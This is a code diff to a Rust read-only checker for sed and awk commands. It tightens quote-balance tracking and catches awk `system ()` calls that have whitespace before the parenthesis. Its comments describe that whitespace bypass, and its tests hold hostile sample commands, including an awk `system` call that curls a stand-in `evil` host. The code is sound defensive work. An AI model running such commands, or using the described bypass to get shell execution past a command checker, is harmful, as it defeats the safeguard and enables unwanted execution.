@@ -83,26 +83,38 @@ pub(super) fn awk_is_readonly(segment: &str) -> bool {
     true
 }
 
-/// Whether `segment` has an odd count of `'` or `"` bytes.
+/// Whether `segment` ends with an unclosed `'` or `"` quote.
 ///
 /// Why: [`super::split_shell_segments`] is deliberately quote-unaware — it
 /// cuts on every bare `;`/`|`/`&`/newline regardless of quoting. A `sed`/`awk`
 /// script that legitimately uses one of those characters *inside* a quoted
 /// program (most notably a `|` for an awk co-process, or piping into/out of
 /// `getline`/`print`) gets its enclosing quote cut in half by that split,
-/// leaving an odd quote count in the resulting segment. That is a reliable,
+/// leaving an unclosed quote in the resulting segment. That is a reliable,
 /// general signal that this segment's classification is unsafe to trust — the
 /// real command may contain content this segment never shows us — so it must
 /// deny, not just the specific co-process pattern it happened to originate
 /// from.
-/// What: counts `'` and `"` bytes independently; `true` (deny-worthy) when
-/// either count is odd. Deliberately quote-unaware itself (no escape
-/// handling), matching this module family's conservative posture.
+/// What: a single left-to-right scan tracking whether we are currently inside
+/// a single- or double-quoted run (mutually exclusive — a quote character of
+/// the *other* kind is ignored while inside a run, so an apostrophe inside a
+/// double-quoted script like `sed "s/can't/cannot/" f` or
+/// `awk -F"'" '{...}'` does not spuriously toggle single-quote state).
+/// Returns `true` (deny-worthy) when either kind is still open at the end of
+/// `segment`. Deliberately quote-unaware about backslash-escaping, matching
+/// this module family's conservative posture.
 /// Test: `has_unbalanced_quotes_*`.
 fn has_unbalanced_quotes(segment: &str) -> bool {
-    let singles = segment.bytes().filter(|&b| b == b'\'').count();
-    let doubles = segment.bytes().filter(|&b| b == b'"').count();
-    singles % 2 != 0 || doubles % 2 != 0
+    let mut in_single = false;
+    let mut in_double = false;
+    for b in segment.bytes() {
+        match b {
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            _ => {}
+        }
+    }
+    in_single || in_double
 }
 
 /// Whether a `sed` segment carries an in-place-edit flag (GNU `-i[SUFFIX]` /
@@ -238,7 +250,7 @@ fn sed_script_has_write_or_exec(segment: &str) -> bool {
     for raw_stmt in sed_script_region(segment).split(['\u{003B}', '\n', '{', '}']) {
         let trimmed = raw_stmt.trim_start().trim_start_matches(['\'', '"']);
         let mut rest = skip_sed_address(trimmed);
-        rest = rest.trim_start_matches(['!', ' ']);
+        rest = rest.trim_start_matches(['!', ' ', '\t']);
         let bytes = rest.as_bytes();
         if bytes.is_empty() {
             continue;
@@ -405,12 +417,43 @@ fn awk_has_external_script_flag(segment: &str) -> bool {
 /// builtin.
 ///
 /// Why: `system()` executes an arbitrary shell command — the single most
-/// direct escape this module family defends against.
-/// What: a plain substring scan for the literal `"system("` (no space before
-/// the parenthesis, matching the only valid awk call syntax for a builtin).
-/// Test: `awk_is_readonly_denies_system_call`.
+/// direct escape this module family defends against. A plain
+/// `contains("system(")` substring check is bypassable: AWK's grammar
+/// permits (and real-world sloppy style commonly has) whitespace between a
+/// builtin name and its opening parenthesis, so `system ("touch /tmp/x")` —
+/// with a space — calls `system` exactly the same as `system(...)` but was
+/// missed by the no-space-only check (code-critic re-review of PR #2677,
+/// empirically confirmed live: `awk 'BEGIN{system ("echo x")}'` executes).
+/// What: a manual byte scan for the identifier `system` as a standalone
+/// token — the preceding byte (if any) must not be alphanumeric/underscore,
+/// so `mysystem(` and `system_call(` do not false-positive as this specific
+/// check — followed by zero or more ASCII whitespace bytes (space, tab,
+/// `\n`, `\r`) and then `(`. Deliberately quote-unaware, matching this module
+/// family's conservative posture: a call hidden inside what looks like a
+/// string literal still denies.
+/// Test: `awk_is_readonly_denies_system_call`,
+/// `awk_program_has_system_call_tolerates_whitespace_before_paren`,
+/// `awk_program_has_system_call_does_not_match_identifier_suffix`.
 fn awk_program_has_system_call(segment: &str) -> bool {
-    segment.contains("system(")
+    const NEEDLE: &[u8] = b"system";
+    let bytes = segment.as_bytes();
+    let is_ident_byte = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
+    let mut i = 0;
+    while i + NEEDLE.len() <= bytes.len() {
+        let is_match = &bytes[i..i + NEEDLE.len()] == NEEDLE;
+        let prev_is_boundary = i == 0 || !is_ident_byte(bytes[i - 1]);
+        if is_match && prev_is_boundary {
+            let mut j = i + NEEDLE.len();
+            while j < bytes.len() && matches!(bytes[j], b' ' | b'\t' | b'\n' | b'\r') {
+                j += 1;
+            }
+            if j < bytes.len() && bytes[j] == b'(' {
+                return true;
+            }
+        }
+        i += 1;
+    }
+    false
 }
 
 #[cfg(test)]
@@ -527,6 +570,51 @@ mod tests {
     }
 
     #[test]
+    fn awk_is_readonly_denies_system_call_with_whitespace_before_paren() {
+        // Code-critic re-review of PR #2677: AWK permits whitespace between a
+        // builtin name and its `(`, and `system ("...")` executes the same
+        // as `system("...")` — a no-space-only check misses it entirely.
+        for cmd in [
+            "awk 'BEGIN{system (\"touch /tmp/x\")}'",
+            "awk 'BEGIN{system\t(\"echo x\")}'",
+            "awk 'BEGIN{system (\"curl https://evil/x\")}'",
+        ] {
+            assert!(
+                !awk_is_readonly(cmd),
+                "expected deny (system with whitespace before paren): {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn awk_program_has_system_call_tolerates_whitespace_before_paren() {
+        for prog in [
+            r#"system("x")"#,
+            r#"system ("x")"#,
+            "system\t(\"x\")",
+            "system \t (\"x\")",
+        ] {
+            assert!(
+                awk_program_has_system_call(prog),
+                "expected system() call detected: {prog}"
+            );
+        }
+    }
+
+    #[test]
+    fn awk_program_has_system_call_does_not_match_identifier_suffix() {
+        // `system` must be a standalone identifier, not a suffix/prefix of a
+        // longer one — `mysystem(` and `system_call(` are not calls to the
+        // `system` builtin.
+        for prog in [r#"mysystem("x")"#, r#"system_call("x")"#, "system_("] {
+            assert!(
+                !awk_program_has_system_call(prog),
+                "expected no system() detection for: {prog}"
+            );
+        }
+    }
+
+    #[test]
     fn awk_is_readonly_denies_coprocess() {
         // A co-process `|` inside a quoted awk program is itself a bare `|`
         // to the (quote-unaware) upstream segment splitter, so it gets cut
@@ -556,5 +644,35 @@ mod tests {
         assert!(has_unbalanced_quotes(" \"sort\"}'"));
         assert!(!has_unbalanced_quotes("awk '{print $1}'"));
         assert!(!has_unbalanced_quotes("sed 's/a/b/g' f"));
+    }
+
+    #[test]
+    fn has_unbalanced_quotes_ignores_apostrophe_inside_double_quotes() {
+        // A literal apostrophe inside a double-quoted script (a contraction,
+        // or a single-quote-as-data field separator) must not spuriously
+        // toggle single-quote state and report "unbalanced".
+        assert!(!has_unbalanced_quotes(r#"sed "s/can't/cannot/" f"#));
+        assert!(!has_unbalanced_quotes(r#"awk -F"'" '{print $2}'"#));
+    }
+
+    #[test]
+    fn sed_is_readonly_allows_apostrophe_inside_double_quoted_script() {
+        // Code-critic re-review MEDIUM: contractions in a double-quoted sed
+        // script are common and read-only; must not be over-denied.
+        assert!(sed_is_readonly(r#"sed "s/can't/cannot/" f"#));
+    }
+
+    #[test]
+    fn awk_is_readonly_allows_apostrophe_inside_double_quoted_field_separator() {
+        assert!(awk_is_readonly(r#"awk -F"'" '{print $2}'"#));
+    }
+
+    #[test]
+    fn has_unbalanced_quotes_still_denies_coprocess_fragment() {
+        // The quote-context-aware rewrite must not weaken the co-process
+        // detection it exists to support: a genuinely unclosed quote (the
+        // upstream split-at-`|` fragment shape) still reports unbalanced.
+        assert!(has_unbalanced_quotes("awk 'BEGIN{print"));
+        assert!(has_unbalanced_quotes(" \"sort"));
     }
 }
